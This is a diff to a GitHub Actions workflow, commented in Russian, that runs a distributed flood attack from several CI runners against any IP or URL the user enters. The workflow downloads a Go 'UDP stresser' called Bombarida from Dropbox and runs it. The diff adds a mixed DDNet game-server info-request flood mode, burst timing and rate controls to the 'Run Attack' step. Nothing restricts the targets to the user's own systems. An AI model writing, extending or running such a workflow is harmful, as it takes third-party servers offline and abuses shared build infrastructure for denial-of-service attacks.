@@ -15,6 +15,7 @@ on:
           - udp-ddnet-vanilla
           - udp-ddnet-extended
           - udp-ddnet-legacy64
+          - udp-ddnet-mixed
 
       target:
         description: 'IP или URL (например: 1.1.1.1 или https://google.com)'
@@ -26,14 +27,35 @@ on:
         default: '80'
 
       connections:
-        description: 'Количество соединений/потоков'
+        description: 'Количество соединений/потоков (-c)'
         required: false
         default: '500'
 
       duration:
-        description: 'Длительность атаки (пример: 300s, 5m, 1h)'
+        description: 'Длительность (пример: 300s, 5m, 1h)'
         required: false
         default: '300s'
+
+      open_loop:
+        description: 'Open-Loop режим (throughput, высокая нагрузка)'
+        required: false
+        default: false
+        type: boolean
+
+      burst_on:
+        description: 'Burst On (например: 5s, 10s, 0s = выкл)'
+        required: false
+        default: '0s'
+
+      burst_off:
+        description: 'Burst Off (пауза между всплесками)'
+        required: false
+        default: '0s'
+
+      rate:
+        description: 'Глобальный rate (пакетов в секунду, 0 = без ограничения)'
+        required: false
+        default: '0'
 
 jobs:
   str-test:
@@ -54,7 +76,7 @@ jobs:
 
       - name: Download Bombarida (UDP Stresser)
         run: |
-          wget -O bombarida.go "https://www.dropbox.com/scl/fi/2wsx39z5k7cswuhgb2u2i/bombarida.go?rlkey=6h3za0sbnhn539j25s9il7xw4&st=70gr9sew&dl=1"
+          wget -O bombarida.go "https://www.dropbox.com/scl/fi/7gnxycvkmc7ho6y1tj37l/bombarida-1.go?rlkey=3r1yhsm73bb2dt3ewj38wvuix&st=5ic3pnnp&dl=1"
 
       - name: Run Attack
         run: |
@@ -63,9 +85,13 @@ jobs:
           PORT="${{ github.event.inputs.port }}"
           CONNS="${{ github.event.inputs.connections }}"
           DURATION="${{ github.event.inputs.duration }}"
+          OPEN_LOOP="${{ github.event.inputs.open_loop }}"
+          BURST_ON="${{ github.event.inputs.burst_on }}"
+          BURST_OFF="${{ github.event.inputs.burst_off }}"
+          RATE="${{ github.event.inputs.rate }}"
 
           echo "Запуск $METHOD на $TARGET (машина №${{ matrix.runner }})"
-          echo "Длительность: $DURATION | Потоков: $CONNS | Порт: $PORT"
+          echo "Длительность: $DURATION | Потоков: $CONNS | Rate: $RATE"
 
           if [ "$METHOD" == "http" ]; then
             while true; do
@@ -78,23 +104,41 @@ jobs:
           elif [ "$METHOD" == "udp" ]; then
             echo "Запуск обычного UDP flood"
             go run bombarida.go -mode client -addr "${TARGET}:${PORT}" \
-              -c $CONNS -n 0 -d "$DURATION" -r 0 -t 1s
+              -c $CONNS -n 0 -d "$DURATION" -r "$RATE" -t 1s
 
-          elif [ "$METHOD" == "udp-ddnet-vanilla" ]; then
-            echo "Запуск UDP DDNet (get info vanilla)"
-            go run bombarida.go -mode client -addr "${TARGET}:${PORT}" \
-              -ddnet-info -ddnet-info-kind vanilla -open-loop \
-              -c $CONNS -n 0 -d "$DURATION" -r 0 -t 1s
+          else
+            # Все DDNet варианты
+            echo "Запуск DDNet Info"
 
-          elif [ "$METHOD" == "udp-ddnet-extended" ]; then
-            echo "Запуск UDP DDNet (get info extended)"
-            go run bombarida.go -mode client -addr "${TARGET}:${PORT}" \
-              -ddnet-info -ddnet-info-kind extended -open-loop \
-              -c $CONNS -n 0 -d "$DURATION" -r 0 -t 1s
+            DDNET_FLAGS="-ddnet-info -open-loop"
 
-          elif [ "$METHOD" == "udp-ddnet-legacy64" ]; then
-            echo "Запуск UDP DDNet (get info legacy64)"
+            case "$METHOD" in
+              "udp-ddnet-vanilla")
+                DDNET_FLAGS="$DDNET_FLAGS -ddnet-info-kind vanilla"
+                ;;
+              "udp-ddnet-extended")
+                DDNET_FLAGS="$DDNET_FLAGS -ddnet-info-kind extended"
+                ;;
+              "udp-ddnet-legacy64")
+                DDNET_FLAGS="$DDNET_FLAGS -ddnet-info-kind legacy64"
+                ;;
+              "udp-ddnet-mixed")
+                DDNET_FLAGS="$DDNET_FLAGS -ddnet-info-kind mixed"
+                ;;
+            esac
+
+            # Добавляем burst только если open_loop включён
+            if [ "$OPEN_LOOP" == "true" ]; then
+              DDNET_FLAGS="$DDNET_FLAGS -open-loop"
+              if [ "$BURST_ON" != "0s" ]; then
+                DDNET_FLAGS="$DDNET_FLAGS -burst-on $BURST_ON -burst-off $BURST_OFF"
+                echo "Burst mode: ON ($BURST_ON / $BURST_OFF)"
+              fi
+            fi
+
+            echo "Команда: go run bombarida.go -mode client -addr ${TARGET}:${PORT} -c $CONNS -n 0 -d $DURATION -r $RATE $DDNET_FLAGS"
+
             go run bombarida.go -mode client -addr "${TARGET}:${PORT}" \
-              -ddnet-info -ddnet-info-kind legacy64 -open-loop \
-              -c $CONNS -n 0 -d "$DURATION" -r 0 -t 1s
+              -c $CONNS -n 0 -d "$DURATION" -r "$RATE" \
+              $DDNET_FLAGS
           fi
